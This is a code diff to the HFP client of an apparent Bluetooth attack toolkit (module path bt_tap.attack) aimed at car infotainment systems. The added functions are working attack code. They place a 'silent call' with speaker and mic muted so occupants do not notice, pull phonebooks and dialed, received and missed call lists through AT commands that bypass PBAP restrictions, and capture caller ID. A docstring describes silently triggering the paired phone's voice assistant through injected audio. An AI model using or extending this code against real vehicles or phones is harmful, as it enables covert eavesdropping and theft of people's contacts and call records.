@@ -26,8 +26,8 @@ AT Command Reference (HFP 1.7):
 """
 
 import os
+import re
 import socket
-import struct
 import time
 import wave
 
@@ -217,16 +217,22 @@ class HFPClient:
             return ""
 
     def inject_audio(self, audio_file: str, sample_rate: int = 8000,
-                      use_paplay: bool = True) -> bool:
-        """Inject audio into the call (plays through IVI speakers).
+                      use_paplay: bool = False) -> bool:
+        """Inject audio into the call (plays through IVI speakers via SCO).
 
-        Primary method: paplay via PulseAudio (proven reliable).
-        Fallback: raw SCO socket injection.
+        For call audio injection, SCO is required (not A2DP).
+        A2DP is for media streaming and won't inject into an active call.
         The audio file should be WAV format, mono, 16-bit, 8000/16000 Hz.
+
+        Args:
+            audio_file: Path to WAV file
+            sample_rate: Audio sample rate
+            use_paplay: Use paplay to default BT sink (only works for media, not calls)
         """
         if use_paplay:
-            from bt_tap.attack.a2dp import play_to_car
-            return play_to_car(self.address, audio_file)
+            warning("paplay uses A2DP which doesn't inject into active calls")
+            warning("Using SCO injection instead for call audio")
+            use_paplay = False
 
         if not self.sco_sock:
             if not self.setup_audio():
@@ -274,7 +280,7 @@ class HFPClient:
     def dial(self, number: str) -> str:
         """Initiate a call via the IVI."""
         info(f"Dialing: {number}")
-        return self._send_at(f"ATD{number};")
+        return self._send_at(f"ATD{number};", timeout=30.0)
 
     def answer(self) -> str:
         """Answer an incoming call."""
@@ -340,22 +346,177 @@ class HFPClient:
         return self._send_at("AT+BLDN")
 
     def voice_recognition(self, enable: bool) -> str:
-        """Enable or disable voice recognition on the AG."""
+        """Enable or disable voice recognition on the AG.
+
+        When enabled, triggers Siri/Google Assistant/Alexa on the paired phone.
+        Combined with audio injection, this can be used to:
+          - Issue voice commands to the phone through the IVI
+          - Trigger voice assistant actions silently
+        """
         return self._send_at(f"AT+BVRA={1 if enable else 0}")
 
-    def _send_at(self, command: str) -> str:
-        """Send AT command and receive response."""
+    def negotiate_codec(self, prefer_msbc: bool = True) -> bool:
+        """Negotiate audio codec with the AG (CVSD or mSBC).
+
+        mSBC (modified SBC) provides 16kHz wideband audio vs CVSD's 8kHz.
+        Modern IVIs support mSBC for higher quality calls.
+
+        HFP 1.6+ codec negotiation:
+          1. HF sends AT+BAC=1,2 (supported codecs: 1=CVSD, 2=mSBC)
+          2. AG sends +BCS:<codec_id> to select codec
+          3. HF confirms with AT+BCS=<codec_id>
+        """
+        if prefer_msbc:
+            codecs = "1,2"  # CVSD + mSBC
+        else:
+            codecs = "1"  # CVSD only
+
+        response = self._send_at(f"AT+BAC={codecs}")
+        if "OK" not in response and "ERROR" not in response:
+            warning("Codec negotiation not supported by AG")
+            return False
+
+        # AG may send +BCS asynchronously — check for it
+        if "+BCS:" in response:
+            codec_id = response.split("+BCS:")[1].strip().split()[0]
+            info(f"AG selected codec: {'mSBC (16kHz)' if codec_id == '2' else 'CVSD (8kHz)'}")
+            self._send_at(f"AT+BCS={codec_id}")
+            return True
+
+        info("Codec list sent — AG will select during next audio connection")
+        return True
+
+    def get_phonebook_via_at(self, memory: str = "ME",
+                              start: int = 1, end: int = 200) -> list[dict]:
+        """Extract phonebook directly via AT commands (bypasses PBAP).
+
+        Many IVIs support AT+CPBS/AT+CPBR even when PBAP is restricted.
+        This is a fallback extraction method.
+
+        Memory types:
+          ME = Phone memory    SM = SIM    DC = Dialed calls
+          RC = Received calls  MC = Missed calls  FD = Fixed dialing
+          ON = Own numbers
+        """
+        info(f"Extracting phonebook via AT (memory={memory}, range={start}-{end})...")
+
+        # Select phonebook memory
+        response = self._send_at(f'AT+CPBS="{memory}"')
+        if "ERROR" in response:
+            warning(f"Cannot select memory {memory}")
+            return []
+
+        # Read entries
+        response = self._send_at(f"AT+CPBR={start},{end}", timeout=15.0)
+        entries = []
+        for line in response.splitlines():
+            line = line.strip()
+            if line.startswith("+CPBR:"):
+                parts = line[6:].split(",", 3)
+                if len(parts) >= 4:
+                    entries.append({
+                        "index": parts[0].strip(),
+                        "number": parts[1].strip().strip('"'),
+                        "type": parts[2].strip(),
+                        "name": parts[3].strip().strip('"'),
+                    })
+
+        if entries:
+            success(f"Extracted {len(entries)} phonebook entries from {memory}")
+        else:
+            warning(f"No entries found in {memory}")
+        return entries
+
+    def get_call_history_via_at(self) -> dict:
+        """Extract call history (dialed, received, missed) via AT commands."""
+        history = {}
+        for mem, desc in [("DC", "Dialed"), ("RC", "Received"), ("MC", "Missed")]:
+            entries = self.get_phonebook_via_at(mem)
+            if entries:
+                history[desc] = entries
+        return history
+
+    def silent_call(self, number: str) -> bool:
+        """Initiate a call with volume muted (stealth dial).
+
+        Dials the number then immediately mutes the speaker and mic
+        so the car occupant doesn't hear the call.
+        """
+        info(f"Silent call to {number}...")
+        result = self.dial(number)
+        if "OK" in result or "ERROR" not in result:
+            # Immediately mute speaker and mic
+            self._send_at("AT+VGS=0")  # Speaker volume 0
+            self._send_at("AT+VGM=0")  # Mic volume 0
+            success("Call initiated with volume muted")
+            return True
+        return False
+
+    def wait_for_incoming(self, timeout: int = 300) -> dict | None:
+        """Wait for an incoming call and extract caller ID.
+
+        Listens for RING and +CLIP (Calling Line Identification) unsolicited
+        results from the AG.
+
+        Returns:
+            {"number": "+1234567890", "name": "John Doe", "type": 145} or None
+        """
+        info(f"Waiting for incoming call ({timeout}s)...")
+
+        # Enable CLIP (caller ID presentation)
+        self._send_at("AT+CLIP=1")
+
+        deadline = time.time() + timeout
+        buffer = b""
+
+        while time.time() < deadline:
+            try:
+                data = self.rfcomm_sock.recv(1024)
+                if data:
+                    buffer += data
+                    text = buffer.decode("utf-8", errors="replace")
+
+                    if "RING" in text or "+CLIP:" in text:
+                        result = {"number": "", "name": "", "type": 0}
+                        # Parse +CLIP: "number",type,,"name"
+                        clip_m = re.search(
+                            r'\+CLIP:\s*"([^"]*)",\s*(\d+)(?:,\s*,\s*"([^"]*)")?',
+                            text
+                        )
+                        if clip_m:
+                            result["number"] = clip_m.group(1)
+                            result["type"] = int(clip_m.group(2))
+                            if clip_m.group(3):
+                                result["name"] = clip_m.group(3)
+                        success(f"Incoming call: {result['number']} ({result.get('name', 'Unknown')})")
+                        return result
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+
+        info("No incoming call detected")
+        return None
+
+    def _send_at(self, command: str, timeout: float = 5.0) -> str:
+        """Send AT command and receive response.
+
+        Args:
+            command: AT command string
+            timeout: Response timeout in seconds (default 5s, use longer for ATD)
+        """
         if not self.rfcomm_sock:
             error("Not connected")
             return ""
 
         try:
-            cmd = f"\r\n{command}\r\n"
+            # Standard AT format: command followed by \r (no leading \r\n)
+            cmd = f"{command}\r"
             self.rfcomm_sock.send(cmd.encode())
 
             # Collect response
             response = b""
-            deadline = time.time() + 3.0
+            deadline = time.time() + timeout
             while time.time() < deadline:
                 try:
                     data = self.rfcomm_sock.recv(1024)
@@ -383,14 +544,13 @@ class HFPClient:
 
     def _parse_indicator_mapping(self, response: str):
         """Parse +CIND=? response for indicator names."""
-        import re
-        indicators = re.findall(r'\("(\w+)"', response)
+        # Match indicator names which may contain hyphens (e.g., "battery-level")
+        indicators = re.findall(r'\("([\w-]+)"', response)
         for i, name in enumerate(indicators):
             self.indicators[name] = i
 
     def _parse_indicator_values(self, response: str):
         """Parse +CIND? response for current indicator values."""
-        import re
         values_str = response.split(":")[1].strip().split("\r")[0] if ":" in response else ""
         values = re.findall(r"(\d+)", values_str)
         indicator_names = list(self.indicators.keys())
